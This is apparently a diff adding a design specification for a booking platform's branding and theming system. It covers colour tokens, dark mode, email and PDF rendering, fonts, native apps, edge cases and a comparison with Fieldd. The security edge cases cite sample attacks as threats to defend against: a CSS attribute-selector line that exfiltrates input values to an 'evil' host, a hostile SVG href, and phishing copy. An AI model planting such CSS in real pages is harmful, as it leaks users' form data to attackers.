+  light: {canvas, card, text, muted, link, buttonBg, buttonFg, border, headerBg},   // concrete hex only (no CSS vars: poor client support [I])
+  dark:  {…same keys…},
+  fonts: {stack: "'BrandSans', Arial, Helvetica, sans-serif", webFontCss?: "@font-face{…woff2 url…}" },
+  logo: {light: png@2x, dark: png@2x, plated: png@2x, width},
+  button: {radius: min(R,24), vmlArcsize: round(R/height*100)+'%'}
+}
+render(template html with class hooks) →
+  1. inline light styles into style="" attributes (inliner keeps media queries in <style>)
+  2. add <meta name="color-scheme" content="light dark"><meta name="supported-color-schemes" content="light dark">
+  3. add <style> @media (prefers-color-scheme: dark){ .pl-canvas{background:#… !important} … .pl-logo-light{display:none!important} .pl-logo-dark{display:block!important} }
+     + Outlook.com dark selectors [data-ogsc] / [data-ogsb] equivalents [I]
+  4. logo strategy: if business has a dark logo → two <img>, dark one hidden by default (mso-hide:all; display:none)
+     else → plated logo (logo on light rounded plate) so forced inversion in Gmail apps keeps it legible
+  5. bulletproof buttons: table-based + VML roundrect for Outlook desktop (Word engine ignores border-radius) [I]
+  6. text colors never pure #000/#fff on brand plates (reduces harsh auto-inversion artifacts) [I]
+  7. size check: keep HTML < 100 KB (Gmail clips messages larger than ~102 KB [I])
+  8. plain-text alternative generated by 08
+```
+
+### 10.10 Document / PDF render
+
+```
+render(docVersion, releaseVersion):
+  html = 04.template(doc) with class hooks; css = printCss(release) where
+     @page { size: Letter|A4; margin: {margins} } ; color: light tokens only; tables avoid page-break-inside on rows;
+     thead repeated per page; footer page counter "Page X of Y"
+  fonts: embeddable faces → @font-face with file URLs (full hinted originals for PDF); non-embeddable → fallback family
+  logo: SVG inline (vector) ; raster at ≥300dpi for printed size
+  headless browser: emulateMedia('print'), forced data-mode=light, deviceScaleFactor 2, wait fonts.ready & images, printToPDF(tagged=true)
+  post: set metadata (Title, Author=business, Lang), optional PDF/A conversion (open question), hash → 04 stores
+  timeout 15 s; on failure → retry ×2 → fallback "simple" template (system fonts, no images except logo) → alert
+```
+
+### 10.11 Token → native platforms (shared token JSON → platform outputs)
+
+```
+source: resolved tokens (both modes) as canonical JSON (§7.3) + font manifests + asset manifest
+transforms (Style-Dictionary-like pipeline [I]):
+  iOS (Swift):   colors → runtime theme struct with UIColor/Color dynamic providers { traitCollection.userInterfaceStyle == .dark ? dark : light };
+                 typography → Font.custom(name, size, relativeTo: .body) so Dynamic Type scales;
+                 radius/spacing → CGFloat constants; shadows → (color, radius, x, y, opacity) — iOS shadow radius ≈ CSS blur/2 [I];
+                 fonts downloaded (woff2→ shipped as TTF/OTF for iOS since CoreText registers TTF/OTF [I]) and registered via CTFontManagerRegisterFontURLs at runtime
+  Android (Kotlin/Compose): ColorScheme(light/dark) from semantic tokens; Typography with downloaded FontFamily; dp/sp units
+                 (spacing px→dp 1:1 at mdpi baseline; font px→sp); elevation → Material elevation + shadow tint
+  Desktop app:   same web CSS (desktop app hosts the web CRM); OS dark mode → `system`; title-bar color from bg.header
+  JSON (generic): for partners/MCP-built custom booking UIs (Bookings MCP [S: llms] parity) — public read-only theme endpoint
+bundle size budget ≤ 25 KB gz; fonts separate, cached by hash
+runtime: app holds last good bundle; fetch on launch/foreground with ETag; apply atomically (no half-themed screens);
+         invalid bundle (schema/version mismatch) → keep previous, report telemetry
+```
+
+### 10.12 Payment element appearance mapping (contract with 05)
+
+Map `component.payment-element.*` to the processor's appearance options (variables such as primary
+color, background, text, danger, border radius, font family, spacing) — exact keys depend on the
+processor chosen in 05 [I]. Fonts: pass the web font CSS URL only if the processor allows custom font
+sources; otherwise system stack. Mode: pass dark variables when the page is in dark mode; re-mount on
+mode toggle (processor iframes don't inherit CSS vars).
+
+### 10.13 Draft concurrency & merge
+
+```
+patch(expectedRevision, sectionRevisions, ops):
+  if expectedRevision == draft.revision → apply
+  else:
+    touched = sectionsOf(ops)
+    if ∀ s ∈ touched: sectionRevisions[s] == draft.sectionRevisions[s] → apply (non-overlapping concurrent edit)
+    else → 409 {conflictingSections, theirChanges}
+client on 409: show "Alex changed Colors" dialog → Reload theirs | Overwrite mine (re-sends with current revisions)
+```
+
+### 10.14 Website brand import scoring
+
+```
+logoCandidates = [...headerImgs, ...inlineSvgs, appleTouchIcon, ogImage, favicon]
+score = 3·inHeader + 2·hasLogoKeyword(alt|class|id|filename) + 1·topLeft(position) + 1·isSvg − 2·isTooSmall(<32px) − 3·isPhoto(entropy high)
+colors: screenshot → kmeans OKLab k=8 weighted by area; boost colors of computed `background-color` on <button>, a.btn, [class*=cta]
+roles: primary = highest (ctaWeight × chroma); neutral = largest low-chroma; accent = second chromatic hue ≥ 40° from primary
+fonts: computed font-family of h1,h2,body → first non-generic family → normalize → exact/fuzzy match in mirrored catalog
+```
+
+### 10.15 Copy resolution at render
+
+```
+t(key, vars, ctx):
+  def = REGISTRY[key] ?? fail('unknown key')                      // build-time check
+  for loc in chain(ctx.locale, tenant.defaultLocale):             // §5.8
+     s = release.copy[loc]?.[key] ?? PLATFORM_DEFAULTS[loc]?.[key]
+     if s: break
+  msg = icuFormat(s, vars, loc)                                   // escapes vars; plural/select
+  if missingVar(msg) → log + return icuFormat(PLATFORM_DEFAULTS[loc][key], vars)
+  return preview ? wrap(msg, data-copy-key=key) : msg
+```
+
+---
+
+## 11. Edge cases & failure modes
+
+### 11.1 Colors & contrast
+1. Brand primary is very light (e.g. `#FFE600` yellow): white text fails; on-color becomes ink; light-mode
+   link color can't be yellow → `fg.brand` picks primary.700/800 (dark mustard) and the editor explains
+   "Your yellow is used for buttons and highlights; links use a darker shade for readability".
+2. Brand primary is near-black (`#111111`): dark-mode button would vanish on dark canvas → dark
+   `action.primary.bg` chooses a lighter step (or inverts to light button with dark text); warning
+   "Your brand color is very dark; in dark mode buttons use a lighter tint".
+3. Primary is pure neutral (chroma ≈ 0): hue undefined in OKLCH → treat hue as NaN-safe 0; neutral tint uses
+   cool default; hue drift disabled.
+4. Out-of-sRGB input (`oklch()` or Display-P3 typed by a designer) → gamut-mapped, user warned "Adjusted to a
+   displayable color".
+5. Two seeds identical (primary = accent) → accent ramp aliases primary (no duplicate CSS).
+6. User pins a semantic token to a raw hex, then changes brand primary → pinned token doesn't follow; badge
+   "3 tokens didn't follow your new color — Unpin?".
+7. Alias cycle via overrides (`a → b → a`) → validation error at patch time; depth > 8 → error.
+8. Danger hue set to green → hue guard rejects (§5.5).
+9. Worker calendar colors: 30 workers but 16 categorical colors → colors reused with pattern variants
+   (stripe/dots) on chips for distinction; color-vision assist on by default when collisions occur.
+10. Semi-transparent tokens composited over images (hero) can't be statically audited → sample-based audit
+    plus runtime guarantee: text on hero always sits on a scrim box with min opacity computed at publish.
+11. Forced-colors mode (Windows High Contrast): brand colors ignored by the OS → ensure borders on buttons,
+    SVG icons use `currentColor`, focus visible — logos keep `forced-color-adjust: none` only for the logo image.
+12. Contrast is fine in light, fails only in dark (common) → blocking applies per mode; "Fix dark only" action.
+
+### 11.2 Fonts
+13. Uploaded font has no Latin glyphs (e.g. a display font with only uppercase) → warning "Lowercase letters
+    missing — text will mix with the fallback font"; block as body font, allow as heading.
+14. Font lacks `€`, `£`, `₱` or currency symbol of the business currency → per-glyph fallback happens
+    automatically; warn when prices would render mixed fonts.
+15. Font file is a renamed `.woff` with `.ttf` extension → magic-byte detection handles it.
+16. Font is corrupt or crafted to exploit parsers → OTS-class sanitizer rejects; processing runs in sandbox
+    with CPU/memory limits; never parsed in the API process.
+17. Variable font with `wght` 300–700 but owner chooses heading weight 800 → snapped to 700, UI shows
+    "Max weight in this font is 700".
+18. Font licence withdrawn after documents were already emailed → existing PDFs unchanged (fonts embedded
+    under licence at the time); new renders use fallback.
+19. Huge CJK font (10+ MB) → full-file delivery is too heavy. v1: CJK fonts allowed only for
+    headings with on-demand subsetting of the business's actual heading strings (copy + catalog names);
+    body CJK uses system fonts [D]; flagged in §13.
+20. Google Fonts family updated upstream (new version, metrics changed) → we pin the downloaded version per
+    release; catalog sync introduces new version only when a new release is published (no surprise CLS).
+21. Font fails to load on the customer's device (blocked by network/content filters) → metric-matched fallback
+    already displayed; no invisible text (never `font-display: block`).
+22. Mixed-direction text (Hebrew name in English UI) → `unicode-bidi: plaintext` on user-generated fields.
+
+### 11.3 Logos, images, icons
+23. Logo SVG references external fonts (`<text font-family="Brand">`) → text renders in fallback; sanitizer
+    warns "Convert text to outlines in your design tool"; option to rasterize at upload.
+24. SVG with `<use href="https://evil">` / `onload` / `<foreignObject>` / `javascript:` → stripped; report shown;
+    if result renders empty (all content was stripped) → reject.
+25. SVG bomb (100k nested groups) or billion-laughs entities → parser limits reject.
+26. PNG decompression bomb (tiny file, 50k×50k) → header dimension check before decode; reject > 40 MP.
+27. Transparent PNG logo that is black-on-transparent shown in dark mode → auto dark variant suggestion; until
+    the owner acts, the dark header uses a light plate behind the logo (never invisible logo).
+28. Logo with white background box on a non-white header → "Remove background" (flat-color flood fill) or keep
+    with a plate; warn.
+29. Extremely wide logo (12:1) in mobile header → mobile placement defaults to Mark; if no mark → text name or
+    scaled wordmark with min height 16 px (legibility warning).
+30. Owner uploads someone else's trademark (e.g. a franchise brand they don't own) → platform takedown process
+    (`QuarantineAsset`), audit; ToS covers it.
+31. EXIF orientation on JPEG logo → orientation applied, metadata stripped (privacy: GPS).
+32. Icon mapping references an archived service → ignored; mapping GC on next publish.
+33. Custom icon with multiple colors and "inherit color" chosen → recolor would destroy meaning → keep original
+    colors, mark non-recolorable; contrast against dark canvas checked (3:1 recommended).
+
+### 11.4 Publishing, versions, caching
+34. Two admins publish at the same instant → idempotency + `expectedRevision`; second gets 409 "Already
+    published v15 by Alex 3 s ago — review changes".
+35. Publish during compile failure of one artifact (e.g. PDF stylesheet) → whole release fails; live untouched;
+    no partial brand on some surfaces.
+36. Edge KV write succeeds in some regions, lags in others → pointer TTL 60 s and HTML purge are idempotent;
+    artifacts are immutable so mixed versions across regions for ≤ 60 s are internally consistent per page.
+37. HTML cached with old artifact URLs after purge failure → still renders correctly (old artifacts retained),
+    pointer TTL bounds staleness; monitoring alarms on purge errors.
+38. Scheduled publish at 00:00 during DST transition (non-existent local time 02:30 on spring-forward) → schedule
+    stored as UTC instant computed at scheduling; non-existent local times rejected with "Pick another time";
+    ambiguous fall-back times ask "first or second 1:30".
+39. Rollback to a version whose font has been taken down → rollback compiles with fallback and warns.
+40. Rollback to a version older than plan's retained history → not offered (plan limit) unless pinned.
+41. Draft references an asset another admin deletes → delete blocked if referenced by draft? Draft refs **do not**
+    block deletion (only live/pinned/scheduled do); draft shows "Missing image — choose another"; publish blocked
+    until fixed.
+42. Browser offline during editing (CRM PWA) → ops queued locally; publish disabled offline.
+43. Preview link leaked publicly → noindex, expiry ≤ 7 days, revocable, passcode option, rate limit per link;
+    shows only fixture data (no customer PII).
+44. Very old email opened years later → image URL immutable and retained ≥ 2 years; afterwards a neutral
+    1×1 placeholder (no broken-image icon) [D].
+
+### 11.5 Modes & viewer preferences
+45. Customer chooses dark, then business disables the toggle → explicit cookie still honoured? Decision: business
+    toggle-off hides the control and **resets** to business default for new visits but honours an existing
+    cookie for 30 days [D] (avoid jarring switch mid-booking).
+46. `system` mode and OS switches at sunset while booking → page re-themes live via media query; no reload, no
+    state loss; animations suppressed for the switch.
+47. Embedded iframe in a dark host page but booking theme light → `match_host` option; loader reads host's
+    `prefers-color-scheme` / `data-mode` and posts to iframe; if host uses a custom dark class without media
+    query, host can set `data-mode` on the embed container.
+48. Third-party cookies blocked in embeds → mode preference falls back to `localStorage` of the iframe origin
+    (partitioned) or host-provided attribute; never breaks rendering.
+49. Staff user in two businesses with different workspace themes → personal mode/density follow the user;
+    colors follow the business currently open; switching business re-themes without reload.
+50. High-contrast staff preference + business compact density → accessibility preference wins (min target sizes).
+51. Email clients that strip `<style>` (some webmail) → inlined light styles still produce a readable email; dark
+    mode simply not applied.
+52. Gmail app forced inversion turns brand-colored button text unreadable → plate/border strategies and avoiding
+    pure black/white reduce artifacts; we cannot fully control it — documented to the owner in preview
+    ("Gmail may adjust colors").
+
+### 11.6 Responsive & accessibility
+53. 320 px wide device with 200% text zoom → reflow test in CI; sticky summary collapses to a single line;
+    no horizontal scroll except tables.
+54. Landscape phone with keyboard open (≈ 150 px usable height) → sticky footer hidden while an input has focus.
+55. iPad Split View 1/3 width (≈ 320–400 px) → container queries render phone layouts inside the narrow pane.
+56. Foldables (posture changes, `viewport-segments`) → treated as width changes; no special layout v1.
+57. Long German/French translations overflow button labels → buttons wrap to 2 lines (never truncate CTAs);
+    copy editor warns at edit time via measurement in preview.
+58. RTL locale with a logo designed LTR → logos never mirrored; icons with direction semantics (arrows, back)
+    mirrored via `[dir=rtl]` transform; numbers/prices remain LTR isolates.
+59. Screen reader announcing every price update during rapid add-on toggling → debounce live region 500 ms,
+    announce final total only.
+60. Touch drag on calendar conflicts with page scroll → long-press to drag; two-finger scroll in grid; explicit
+    "Move" menu alternative.
+61. Reduced-motion users and auto-advancing booking steps → no auto-advance animation; focus moves to the new
+    step heading with a polite announcement.
+
+### 11.7 Native apps
+62. App theme bundle fails to download (offline at first launch) → baked fallback bundle from build time.
+63. New token added by platform not known by an old app version → bundle includes `minAppVersion` per token
+    group; old apps ignore unknown keys; required tokens have platform defaults in-app.
+64. Business's Apple Developer membership lapses → app remains in store until Apple removes it; builds blocked
+    (`blocked_credentials`); owner notified 30 days before expiry when detectable via API.
+65. App Store rejects branded app (e.g. guideline 4.2 minimum functionality / 4.3 spam for near-identical apps
+    [I]) → rejection reason surfaced; checklist of differentiators (business content, own account); support
+    assist. Risk logged in §13.
+66. Custom font licence covers web but not app embedding → attestation text covers "apps"; if owner unticks
+    app use (future granular licence), apps use fallback stack.
+
+### 11.8 Security & abuse
+67. Custom CSS attempting data exfiltration (`input[value^=a]{background:url(//evil/a)}`) → `url()` origin
+    restriction + attribute-selector ban + CSP `img-src` allowlist.
+68. Custom CSS overlaying a fake "Pay here" message over the real form → `position: fixed` banned,
+    `::before/::after` `content` with text limited to 64 chars on non-guard parts, guard test checks occlusion.
+69. Copy override phishing (e.g. "Pay at evil.com") → links in richText keys limited to http(s) with a domain
+    allowlist: business website domain(s) + platform domains; others need owner confirmation and are shown
+    with visible URL; platform abuse scanning on copy changes for known phishing patterns [D].
+70. Malicious uploaded file name (`../../x.svg`, unicode RTL override) → stored by generated key; display name
+    sanitized/escaped.
+71. Brand impersonation (business copies another company's brand) → takedown workflow; not technically
+    preventable.
+72. Preview iframe in CRM loads tenant custom CSS → sandboxed iframe on a separate origin so CSS/JS can't touch
+    the CRM session.
+
+---
+
+## 12. Better than Fieldd
+
+### 12.1 Concrete improvements (vs. what the research shows Fieldd offers)
+
+| # | Fieldd (as researched) | Ours | Why it matters |
+|---|---|---|---|
+| B1 | Style: colors, fonts, map, text for the portal [S: T05] | Full token system with **separate light & dark palettes**, auto-derived from 1–4 brand colors, editable down to each token | Owner requirement; professional brands need exact control |
+| B2 | No evidence of contrast checking | WCAG contrast audit on every pair, **one-click minimal fixes**, publish gating on public text | Accessibility, fewer "unreadable button" disasters, legal exposure (ADA web suits) reduced [I] |
+| B3 | "reflected immediately on your customer portal" [S: T05] — edits go live directly | **Draft → preview → publish** with **versioned releases**, scheduled publish and **one-click rollback** | Safe experimentation; rebrand launches; undo mistakes |
+| B4 | Brand logo & colors reused in emails [S: T12]; document look under Communication → Email [S: T04] | One Brand Kit drives **all** surfaces incl. PDFs, SMS pages, tracking, embed, QR, app, CRM | Consistency, fewer settings screens |
+| B5 | Fonts: picker (details unknown) | Google Fonts (self-hosted, GDPR-friendly) + **custom font upload** (WOFF2 conversion, subsetting, metric-matched fallbacks, licence handling, PDF embedding rules) | Brand fidelity without speed or legal penalties |
+| B6 | Logo upload (details unknown) | Light/dark **variants**, **per-placement sizing**, auto favicon/app icons/PWA/OG image, optical sizing, auto dark-variant suggestion | Logos look right everywhere, zero layout shift |
+| B7 | No icon customization seen | Icon set choice + custom SVG (sanitized) + auto-suggested mappings for services/categories | Industry-specific look (detailing vs cleaning) in minutes |
+| B8 | Text overrides incl. "routes text" [S: T02] | Every customer-facing key, ICU plurals, **per-locale**, inspect-to-edit in preview, import/export, AI translation suggestions | Multilingual markets (es-US, fr-CA) out of the box |
+| B9 | Dark mode toggle in the CRM side menu [S: llms] | Dark mode on **every** surface incl. public site, emails, app; per-viewer preference synced across devices; no flash of wrong theme | Polish; customer comfort at night |
+| B10 | Branded team app only on Pro ($999) [S: llms] | Workspace branding (logo/accent) on all tiers; full workspace theme from `starter` | Small businesses feel ownership of their tool |
+| B11 | "no fieldd branding" only on Pro [S: llms] | Badge removal from `team` tier (proposal) | Affordability goal |
+| B12 | Unknown responsiveness | Explicit responsive system: container queries, tablet split-views, on-site customer-facing mode, phone booking builder | Owner requirement; real field use on iPads |
+| B13 | — | Custom CSS (pro) with guardrails that protect legal/payment/consent elements | Agency-grade control without breaking checkout |
+| B14 | AI setup imports branding from website [S: llms] | Same capability, but every import lands in **draft** with provenance and licence-safe font handling | Speed without surprises |
+| B15 | — | Performance budgets enforced at compile (≤ 4 KB critical CSS, ≤ 2 preloaded fonts) | BRIEF performance bar for live sites |
+| B16 | — | Brand health card + preview of emails in simulated Gmail/Outlook dark | Fewer support tickets ("my email logo disappeared") |
+| B17 | Multi-business hub, profile cloning [S: llms] | Brand templates with section locks for franchises | Consistent multi-location brands |
+
+### 12.2 Budget-tier notes (what a starter business needs vs. gated)
+
+- A brand-new business needs: logo upload, one primary color, font pairing, defaults everywhere — the Quick
+  setup takes < 3 minutes and produces an accessible light+dark brand automatically. All of this is on every
+  tier (§5.17).
+- Costs that justify gating: branded native apps (store ops, builds, support), custom CSS (support load +
+  guardrail rendering compute), unlimited locales (translation support), badge removal (marketing value).
+- Cheap-to-serve design: compiled artifacts are tiny, immutable and shared across tenants where possible
+  (platform component CSS, Google font files deduped across tenants), so deep branding adds negligible
+  infrastructure cost per tenant [D].
+
+---
+
+## 13. Open questions
+
+1. **Custom CSS tier & scope** — Pro only (proposed) or also `team`? Allow it in the customer account area
+   (more risk: payment methods page) or booking flow only?
+2. **Branded native app model** — require each business's own Apple/Google developer accounts (App Store
+   guideline 4.2.6 risk mitigation, extra cost/friction for the business) vs. platform-account submission
+   (simpler, higher rejection risk). Also: is the branded *customer* app in v1 at all, or PWA first?
+3. **Workspace (CRM) branding depth** — should businesses be allowed to fully recolor the CRM, or only
+   logo + accent (supportability: screenshots in help docs, training videos look different per tenant)?
+4. **Multiple brands per business** (e.g. one company running "Acme Detailing" and "Acme Pressure Wash"
+   with separate booking subdomains) — 1:N Brand Kits now or later? Affects 01's `PortalSite` (1:1 today).
+5. **Default platform palette & font** — choose the platform's own neutral identity (product not yet named);
+   needs owner/brand decision.
+6. **Contrast override policy** — should owners ever be able to publish failing text contrast on public
+   surfaces (proposed: typed override) or should it be impossible?
+7. **PDF/A archival and e-invoicing formats** (e.g. EU structured e-invoices) — in scope for 04/11 v1?
+8. **CJK / complex-script custom fonts** — support on-demand subsetting in v1 or system fonts only?
+9. **Adobe Fonts / commercial font services** (domain-locked kits) — support in v1?
+10. **Calendar colors** — are worker colors (09) allowed outside the categorical palette (free hex) with
+    auto-adjusted text, or restricted to the AA-safe palette?
+11. **Email dark-mode strategy** — "Adaptive" default acceptable to the owner given Gmail's partial
+    inversion cannot be fully controlled?
+12. **Edge HTML rewrite for mode** — acceptable to require an edge function (infrastructure decision in
+    Stage 2), or fall back to a tiny inline blocking script for `data-mode` from cookie?
+13. **Payment processor appearance limits** (05's processor choice) — can it load tenant fonts?
+14. **Hub template locks** — can a franchisee override locked copy for local legal text (state-specific)?
+15. **Retention** of email-referenced logo artifacts beyond 2 years (storage cost vs. old emails rendering).
+
+---
+
+## 14. Verify against video
+
+Owner's walkthrough (https://youtu.be/vyELvdWCdnc — customer side of a Fieldd-powered business site,
+e.g. swash.co) and any later CRM recording. For each item, note timestamp + screenshot.
+
+**Customer-facing booking site (swash.co-style)**
+- [ ] Hostname of the booking site (subdomain of the business's site?) and whether the business's main
+      website header/nav is replicated on the booking subdomain or replaced by a minimal header.
+- [ ] Header: logo position (left/center), logo size on desktop vs phone, whether logo links to main site.
+- [ ] Which colors are clearly brand-driven: buttons, links, selected service card, selected time slot,
+      progress indicator, header background, footer.
+- [ ] Fonts: does the booking site use the business's website font or a generic one? Same font for headings
+      and body?
+- [ ] Corner radius and shadow style of cards/buttons (rounded? pill? flat?).
+- [ ] Is there a light/dark toggle or does it follow the device? Try with the phone in dark mode.
+- [ ] Any "Powered by Fieldd" badge, its position and wording.
+- [ ] Icons: are categories/services shown with icons, photos, or text only?
+- [ ] Map on the address step: style (standard/muted/dark), pin color [S: T05 "the map"].
+- [ ] Any visible text that matches a customizable label (e.g. "Anytime Thursday" routes text [S: T02]).
+- [ ] Phone layout: sticky summary/footer button? bottom sheet? step indicator style? date picker style.
+- [ ] Tablet/desktop layout: right-side cart/summary rail? max content width? multi-column service grid?
+- [ ] Favicon in the browser tab and the page title format.
+- [ ] Layout shift while loading (logo/fonts popping in) — note if visible.
+- [ ] Confirmation email/SMS received after booking: logo, colors, dark-mode behaviour on the owner's phone.
+- [ ] Quote/invoice email + PDF (if shown): logo placement, accent color usage, fonts.
+- [ ] On-my-way tracking page (if shown): branding, map, worker photo.
+- [ ] Customer account area: navigation layout on phone vs desktop; app download prompts (branded app?).
+
+**Fieldd CRM (if a CRM recording follows)**
+- [ ] Settings → Online scheduling (or Customer hub) → **Style**: exact list of controls (color fields and
+      their names, font picker type, map options, text section structure) [S: T05][S: T02].
+- [ ] Does Style have a live preview? Mobile/desktop toggle? Save vs publish behaviour ("reflected
+      immediately" [S: T05]).
+- [ ] Settings → Communication → Email: quote/invoice look controls [S: T04] — what is configurable.
+- [ ] Email editor brand auto-fill (logo + colors) [S: T12]: where brand colors come from.
+- [ ] Side menu dark-mode switch [S: llms]: position, options (light/dark only, or system?), persistence.
+- [ ] CRM layout on tablet and phone (does Fieldd's CRM have a mobile web layout or only the team app?).
+- [ ] Calendar worker colors [S: T13]: how text color is chosen on colored events; dark-mode appearance.
+- [ ] Team app: any business branding (logo/colors) on the Start/Scale tier vs. Pro "branded team app".
+- [ ] Any font upload, logo variant, icon, radius or shadow controls (expected: none — confirms §12 gaps).
+- [ ] Where QR codes are generated and whether they can be styled (colors/logo) [S: T05][S: llms].
